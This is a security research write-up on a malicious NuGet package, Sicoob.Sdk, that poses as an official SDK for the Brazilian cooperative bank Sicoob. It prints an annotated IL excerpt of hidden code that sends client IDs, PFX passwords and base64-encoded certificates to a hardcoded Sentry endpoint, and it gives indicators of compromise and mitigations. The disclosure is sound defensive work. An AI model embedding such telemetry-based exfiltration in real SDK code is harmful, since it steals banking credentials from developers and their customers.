---
title: "Malicious NuGet Package Impersonates Sicoob SDK to Exfiltrate Banking Certificates and Passwords"
short_title: "Malicious NuGet Impersonates Sicoob SDK"
date: 2026-05-28 12:00:00 +0000
categories: [Malware, NuGet]
tags: [NuGet, .NET, C#, Sicoob, Brazil, Banking, Impersonation, mTLS, PFX, Sentry, T1195.002, T1204.005, T1036.005, T1552.001, T1005, T1041, T1071.001]
canonical_url: https://socket.dev/blog/malicious-nuget-package-impersonates-sicoob-sdk
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/23f6d30639c8e627a28e4eaa375d2027a298d847-1672x941.png?w=1600&q=95&fit=max&auto=format
  alt: "Malicious NuGet Package Impersonates Sicoob SDK to Exfiltrate Banking Certificates and Passwords"
description: "A malicious NuGet package impersonating Sicoob exfiltrated client IDs, PFX passwords, and banking certificates through Sentry telemetry."
---

> `Sicoob.Sdk` releases 2.0.0 through 2.0.4 exfiltrate client IDs, PFX passwords, and base64-encoded PFX certificate archive contents through a third-party Sentry endpoint. The linked GitHub repository appears to be a clean-source façade for the malicious NuGet artifact.

We analyzed a Sicoob-branded NuGet package, [`Sicoob.Sdk`](https://socket.dev/nuget/package/sicoob.sdk), that claimed to be an official C# SDK for Sicoob API integrations. Sicoob, formally the _Sistema de Cooperativas de Crédito do Brasil_, is one of Brazil's largest cooperative financial systems, offering banking and financial services through credit cooperatives, digital channels, and thousands of physical service points nationwide. Public sources describe Sicoob as serving millions of cooperative members across Brazil, with Fitch [reporting](https://www.fitchratings.com/research/fund-asset-managers/fitch-affirms-sicoob-dtvm-investment-management-quality-rating-at-strong-19-11-2025) 9 million members, 328 single cooperatives, and 5,219 service points.

The package is presented as a .NET 8 SDK that manages authentication, mTLS certificates, and access to Sicoob financial and non-financial APIs. The package first appeared on NuGet on May 5, 2026, reached version 2.0.4 on May 6, 2026, and was blocked by NuGet after our abuse report. At the time of analysis, the NuGet profile behind the package, [`sicoob`](https://socket.dev/nuget/package/sicoob.sdk/maintainers/2.0.4), listed 12 packages, all using Sicoob branding and most claiming to be official C# SDK modules.

Our analysis found that [`Sicoob.Sdk`](https://socket.dev/nuget/package/sicoob.sdk/files/2.0.4/lib/net8.0/Sicoob.Sdk.dll) versions 2.0.0 through 2.0.4 exfiltrate sensitive banking authentication material. When a developer instantiates `SicoobClient` with a client ID, a PFX file path, and a PFX password, the package reads the PFX file from disk, base64-encodes its contents, and sends the supplied client ID, PFX password, and encoded PFX data to a hardcoded third-party Sentry endpoint. A PFX file is a password-protected certificate archive that often contains a client certificate and private key for mutual TLS authentication. The stolen material could allow a threat actor to impersonate the victim's Sicoob banking API integration, depending on certificate authorization, API scopes, and Sicoob-side controls.

The linked GitHub organization, `Sicoob-Cooperativa`, also shows high-confidence unauthorized impersonation signals and should not be treated as an official Sicoob source. The organization is newly created, unverified, has no public members, and lacks a Sicoob-controlled reverse reference confirming authorization. Its apparent associated contributor account `joaobcdev` was created within minutes of the organization, and the repositories claim official SDK status while showing minimal public reputation. This identity posture does not align with an established banking institution publishing official developer tooling.

The public GitHub source presents ordinary SDK behavior: it accepts a client ID, PFX path, and PFX password, loads the certificate for mTLS, and configures API clients. The visible source does not contain the Sentry initialization, Sentry message capture, hardcoded Sentry endpoint, PFX file-read telemetry path, or base64 certificate exfiltration logic found in the distributed NuGet DLL. We assess that the GitHub repository likely served as a clean or partially clean source façade for a malicious NuGet artifact.

We reported the malicious `Sicoob.Sdk` package to the Sicoob Security Team, the hardcoded Sentry endpoint to the Sentry Security Team, and the package and associated maintainer account to the NuGet Security Team. We thank the Sentry Security Team for their prompt response and investigation of the associated Sentry project, and we are grateful to the NuGet Security Team for swiftly blocking the package.

The other 11 packages published by the `sicoob` NuGet owner appear to be generated API client modules and did not independently contain the same Sentry-based PFX exfiltration logic. However, they remain untrusted by association because the same malicious publishing identity distributed them, and the confirmed-malicious `Sicoob.Sdk` wrapper package pulled them in as dependencies.

![Socket AI Scanner flags Sicoob.Sdk as malware](https://cdn.sanity.io/images/cgdhsj6q/production/f1157f7992366c641d38b133ef202564154d1b2e-1236x1296.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner flagged `sicoob.sdk` versions 2.0.0 through 2.0.4 as known malware after identifying credential and certificate exfiltration in `lib/net8.0/Sicoob.Sdk.dll`. The detection shows that malicious builds abused Sentry telemetry to transmit banking authentication material, including the supplied client ID, plaintext PFX password, full base64-encoded PFX certificate archive contents, and raw boleto responses, which are Brazilian payment slip or invoice records that may expose transaction details, payment status, amounts, due dates, and payer or payee data._

## SDK as the Secret Thief

Modern software teams install SDKs to simplify access to third-party services. Those SDKs often run in trusted application environments and handle sensitive credentials by design. When an SDK supports a banking integration, that trust boundary becomes especially sensitive.

The risk in `Sicoob.Sdk` comes from its position in the authentication flow. The package asks developers for a client ID, a PFX certificate path, and a PFX password. Together, those values can represent the authentication material needed to access Sicoob APIs.

The package page described `Sicoob.Sdk` as an official C# SDK for Sicoob financial and non-financial APIs. It stated that the SDK manages authentication and mTLS certificates natively in .NET, and its usage example instructed developers to instantiate `SicoobClient` with a client ID, a `.pfx` certificate, and the PFX password. That workflow is expected for a banking SDK that uses mutual TLS. What is not expected is for the SDK to silently read the certificate file, encode its contents, and send the certificate data and password to a third-party telemetry service.

![NuGet listing for Sicoob.Sdk](https://cdn.sanity.io/images/cgdhsj6q/production/24109572df8d90d8491e1d28b6e9a023217a1154-1200x924.png?w=1600&q=95&fit=max&auto=format)
_NuGet listing for `Sicoob.Sdk` captured during the investigation showed 484 total downloads across six versions, including malicious releases `2.0.0` through `2.0.4` published under the `sicoob` owner account. As of publication, NuGet has blocked the package following our abuse report, and we thank the NuGet Security Team for their prompt response._

## Technical Analysis

Static analysis of `Sicoob.Sdk` versions 2.0.0 through 2.0.4 identified a constructor-time exfiltration path in `lib/net8.0/Sicoob.Sdk.dll`. When `SicoobClient` is created outside sandbox mode, the DLL initializes Sentry with a hardcoded DSN, reads the supplied PFX file from disk, base64-encodes the file contents, and sends a Sentry message containing the runtime-supplied client ID, PFX password, and encoded PFX data. Dynamic analysis confirmed the behavior: during normal `SicoobClient` construction, the package emitted a Sentry event containing the runtime-supplied client ID, PFX password, and base64-encoded PFX certificate archive contents.

A simplified IL excerpt with our comments added shows the behavior:

```csharp
// The SicoobClient constructor checks the sandbox flag.
// If isSandbox is true, execution branches past Sentry initialization.
// The documented production-mode usage passes false.
IL_000c: ldarg.s      4
IL_000e: brtrue.s     IL_0035

// Initializes Sentry with a hardcoded project DSN.
IL_0019: ldsfld       <>9
IL_001e: ldftn        <.ctor>b__41_0
IL_002f: call         Sentry.SentrySdk::Init

// Starts building a Sentry message with the supplied client ID.
IL_0119: ldstr        "cliend_id: "
IL_0126: call         get_ClientId

// Adds the plaintext PFX password.
IL_0132: ldstr        "\npass: "
IL_013f: ldfld        PfxPassword

// Reads the supplied PFX file from disk and base64-encodes its contents.
IL_0158: call         get_PfxPath
IL_015d: call         System.IO.File::ReadAllBytes
IL_0162: call         System.Convert::ToBase64String

// Sends the assembled credential and certificate data through Sentry.
IL_0174: call         Sentry.SentrySdk::CaptureMessage
```

The constructor initializes the hardcoded Sentry DSN only when `isSandbox` is `false`, which corresponds to the documented production-mode usage. This condition places the Sentry capture path in the execution mode most likely to receive real client IDs, PFX certificates, and PFX passwords. In sandbox mode, the constructor skips Sentry initialization, which may prevent outbound Sentry delivery and make the behavior less visible during testing.

The hardcoded Sentry destination observed in the package was:

`hxxps://d565e3f03d0b1a7c8935d7ff94237316@o4511335034847232[.]ingest[.]de[.]sentry[.]io/4511337546317904`

Static analysis also identified a separate Sentry capture path for raw boleto API responses. Boleto is a common Brazilian bank payment slip or invoice mechanism. Depending on the API call and account permissions, raw boleto responses may contain sensitive transaction details, payment status, amounts, due dates, identifiers, and payer or payee data. This boleto-response capture path was identified statically; the PFX, password, and client ID exfiltration path was confirmed both statically and dynamically.

## Why This Is Not Reasonable Telemetry

Sentry is a legitimate error monitoring and diagnostics platform. Sentry's .NET documentation [describes](https://docs.sentry.io/platforms/dotnet/) its SDK as a runtime monitoring tool that helps developers investigate errors and performance issues. Normal SDK telemetry might include exception names, SDK versions, runtime versions, HTTP status codes, stack traces, or sanitized diagnostic metadata.

### That is not what happened here.

`Sicoob.Sdk` does not behave like typical commodity malware. It does not drop an executable, launch PowerShell, install persistence, scrape browser profiles, or enumerate environment variables. Instead, it embeds exfiltration logic where developers expect sensitive authentication handling. The package asks developers for a client ID, a PFX certificate path, and a PFX password through a legitimate-looking API, then leaks that material during client initialization.

A PFX file commonly contains a client certificate and private key, and the PFX password unlocks that material. Sending both the PFX contents and password to a third-party endpoint may give the recipient enough material to impersonate the victim's API client, depending on Sicoob's server-side controls, certificate binding, authorized scopes, fraud detection, and approval requirements.

A legitimate SDK could report that a certificate loaded successfully or log sanitized certificate metadata, such as a thumbprint, expiration date, subject, or issuer. It should not transmit the certificate archive or the password needed to use it.

![Sicoob services overview](https://cdn.sanity.io/images/cgdhsj6q/production/c5cf9221cf5d88341ca98da3127ee8fb5d36d555-2048x802.png?w=1600&q=95&fit=max&auto=format)
_Sicoob's website highlights consumer, business, credit, payment, and digital banking services across Brazil. The malicious `Sicoob.Sdk` package abused this trusted financial-services context by presenting itself as an official SDK for Sicoob API integrations._

## Sicoob Impersonation and Source-to-Package Mismatch

The malicious behavior in `Sicoob.Sdk` is not an isolated implementation issue. The surrounding publisher identity, GitHub repository, and source-to-package relationship indicate a broader supply chain impersonation pattern.

The impersonation also extended into developer discovery paths: during the investigation, Google's AI search experience surfaced `Sicoob.Sdk` as the NuGet package for .NET-based Sicoob API integration, increasing the likelihood that developers could land on the malicious package through routine search.

![Google AI summary surfacing Sicoob.Sdk](https://cdn.sanity.io/images/cgdhsj6q/production/1dbfbf1fa7f02354afa5910b8195c2ef379be086-780x307.png?w=1600&q=95&fit=max&auto=format)
_Search amplified the impersonation: Google's AI summary presented `Sicoob.Sdk` as the .NET path for Sicoob API integration, making a malicious NuGet package look like an ordinary developer dependency._

The unified `Sicoob.Sdk` wrapper package linked to the GitHub organization `Sicoob-Cooperativa` (`https://github[.]com/Sicoob-Cooperativa`), whose public repository also claims "SDK Oficial" status and instructs developers to instantiate `SicoobClient` with a client ID, `.pfx` certificate path, and PFX password.

We assess with high confidence that `github[.]com/Sicoob-Cooperativa` should not be treated as an official Sicoob source. The organization is not GitHub-verified, was created on May 4, 2026, has zero followers, and exposes only a self-declared link to the Sicoob developer portal. Its apparent associated contributor account, `joaobcdev` (`https://github[.]com/joaobcdev`), was created roughly two minutes earlier on May 4, 2026, has no public employer, bio, location, verified domain, or followers, and has an adjacent GitHub numeric ID. The organization's public members endpoint returns an empty list, meaning GitHub does not publicly show any Sicoob-affiliated maintainer behind the organization.

![Sicoob-Cooperativa GitHub repository](https://cdn.sanity.io/images/cgdhsj6q/production/0676657e563867af0532553efb1a1ff3f077a7a1-2048x712.png?w=1600&q=95&fit=max&auto=format)
_The suspicious C# SDK repository presents itself as an official Sicoob integration library, but its public GitHub signals show no established trust: zero stars, forks, or watchers, no releases or tags, compressed recent activity, and commits attributed to a newly observed account._

That identity posture contrasts sharply with the older public `github.com/Sicoob` account, which was created in 2017, identifies itself as "Confederação Nacional das Cooperativas do Sicoob", lists Brasília-DF, and links to `www.sicoob.com.br`. We did not find a Sicoob-controlled reverse reference confirming that `Sicoob-Cooperativa`, the NuGet owner `sicoob`, or the published NuGet packages are authorized official Sicoob SDKs.

The source-to-package mismatch is even more concerning. The public GitHub [`SicoobClient.cs`](https://github.com/Sicoob-Cooperativa/sicoob_sdk_csharp/blob/main/SicoobClient.cs) source shows ordinary SDK behavior: it stores the supplied `clientId`, `pfxPath`, and `pfxPassword`, loads the PFX certificate archive via `X509Certificate2`, and adds it to the HTTP client handler for mutual TLS. The visible source does not contain the Sentry exfiltration logic observed in the published NuGet DLL, including `SentrySdk.Init`, `SentrySdk.CaptureMessage`, the Sentry ingestion host, `File.ReadAllBytes(this.PfxPath)`, or `Convert.ToBase64String(...)`.

The public C# project nevertheless declares a `Sentry` dependency in `Sicoob.Sdk.csproj`, while describing itself as "SDK Oficial do Sicoob em C#". In the published NuGet artifact, that dependency is not benign crash reporting: static and dynamic analysis showed that `Sicoob.Sdk` initializes Sentry with a hardcoded DSN, reads the supplied PFX file from disk, base64-encodes it, and sends the client ID, plaintext PFX password, and encoded certificate contents through `SentrySdk.CaptureMessage`.

We assess that the GitHub repository functions as a clean or partially clean source façade, while the distributed NuGet artifact contains additional malicious Sentry-based credential and certificate exfiltration code not present in the visible source. This is a high-confidence source/package mismatch and a strong indicator of supply chain abuse. The evidence supports treating the `sicoob` NuGet profile as malicious and the `Sicoob-Cooperativa` GitHub organization as a high-confidence unauthorized impersonation of Sicoob unless Sicoob confirms otherwise.

## Impact Assessment

The immediate risk is compromise of Sicoob API authentication material. A threat actor who receives the exfiltrated client ID, PFX certificate archive, and PFX password may be able to impersonate the victim application or organization if those credentials are valid and authorized.

In the worst case, this could compromise a victim's Sicoob API integration identity. Depending on the permissions tied to the client ID and certificate, the threat actor could generate tokens and access financial API data, Pix instant-payment operations, boleto operations, account balances and statements, payments, transfers, investment data, savings account data, or Open Finance consent and payment-initiation functions. The exact impact depends on Sicoob-side authorization, certificate binding, scopes, fraud controls, source IP monitoring, and approval requirements.

Developers risk exposing credentials used in local testing or production applications. CI and deployment pipelines face higher risk because PFX files and passwords are often stored in build secrets, deployment variables, mounted secret volumes, or protected configuration stores. If a build or release job instantiates the SDK with real credentials, the exfiltration can occur from a privileged automation environment.

The risk to end users and customers is indirect but serious. A compromised Sicoob integration identity could expose downstream financial data or enable payment abuse affecting account holders, business customers, or payment recipients. The raw boleto response capture path increases this concern because boleto API responses may include transaction details, payer or payee information, amounts, due dates, identifiers, and payment status.

## Recommendations and Mitigations

Organizations should remove `Sicoob.Sdk` immediately and determine whether any application, developer workstation, build job, or production service instantiated `SicoobClient` with real credentials. Treat any real PFX material used with affected versions as compromised.

Affected teams should revoke and replace exposed PFX certificates, rotate PFX passwords, and rotate or disable affected client IDs where possible. They should review Sicoob authentication and API logs for unusual token issuance, source IPs, Pix activity, boleto access, payments, transfers, Open Finance operations, and account data retrieval. Network defenders should also search DNS, proxy, firewall, and EDR telemetry for outbound connections to:

```csharp
o4511335034847232[.]ingest[.]de[.]sentry[.]io
```

Security teams should check repositories, build definitions, deployment scripts, and configuration stores for references to the affected package and constructor pattern:

```csharp
PackageReference Include="Sicoob.Sdk"
dotnet add package Sicoob.Sdk
new SicoobClient(
SICOOB_CLIENT_ID
PfxPath
PfxPassword
```

The safest remediation is to remove `Sicoob.Sdk` and replace it only with code or packages verified through Sicoob-controlled channels. Our review of the 11 related module packages did not identify the same standalone exfiltration logic, but they remain untrusted by association.

For financial integrations, organizations should apply stricter review to any SDK that handles certificates, private keys, OAuth tokens, signing keys, cloud credentials, or other secrets. Dependencies that process authentication material should be treated as high risk and reviewed before production use.

## Indicators of Compromise

### Related publishing and source infrastructure

- NuGet owner account: `sicoob` — `https://www.nuget.org/profiles/sicoob`
- GitHub organization: `Sicoob-Cooperativa` — `https://github[.]com/Sicoob-Cooperativa`
- Associated GitHub contributor account: `joaobcdev` — `https://github[.]com/joaobcdev`

### Malicious package

1. [`Sicoob.Sdk`](https://socket.dev/nuget/package/Sicoob.Sdk) (versions 2.0.0 through 2.0.4)

### Related NuGet package set

1. [`Sicoob-Cooperativa.Sicoob.Auth`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.Auth)
1. [`Sicoob-Cooperativa.Sicoob.CobrancaV3`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.CobrancaV3)
1. [`Sicoob-Cooperativa.Sicoob.ContaCorrente`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.ContaCorrente)
1. [`Sicoob-Cooperativa.Sicoob.ConvenioPagamentos`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.ConvenioPagamentos)
1. [`Sicoob-Cooperativa.Sicoob.Investimentos`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.Investimentos)
1. [`Sicoob-Cooperativa.Sicoob.OpenFinance`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.OpenFinance)
1. [`Sicoob-Cooperativa.Sicoob.PagamentosPix`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.PagamentosPix)
1. [`Sicoob-Cooperativa.Sicoob.PagamentosV3`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.PagamentosV3)
1. [`Sicoob-Cooperativa.Sicoob.Pix`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.Pix)
1. [`Sicoob-Cooperativa.Sicoob.Poupanca`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.Poupanca)
1. [`Sicoob-Cooperativa.Sicoob.SpbTransferencias`](https://socket.dev/nuget/package/Sicoob-Cooperativa.Sicoob.SpbTransferencias)

### Exfiltration endpoint

- Sentry DSN: `hxxps://d565e3f03d0b1a7c8935d7ff94237316@o4511335034847232[.]ingest[.]de[.]sentry[.]io/4511337546317904`
- Sentry ingestion host: `o4511335034847232[.]ingest[.]de[.]sentry[.]io`
- Sentry project ID: `4511337546317904`
- Sentry public key: `d565e3f03d0b1a7c8935d7ff94237316`

The DSN is the full hardcoded endpoint configuration observed in the package. The ingestion host is the network-facing domain useful for DNS, proxy, firewall, and EDR searches.

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools
- T1204.005 — User Execution: Malicious Library
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location
- T1552.001 — Unsecured Credentials: Credentials in Files
- T1005 — Data from Local System
- T1041 — Exfiltration Over C2 Channel
- T1071.001 — Application Layer Protocol: Web Protocols
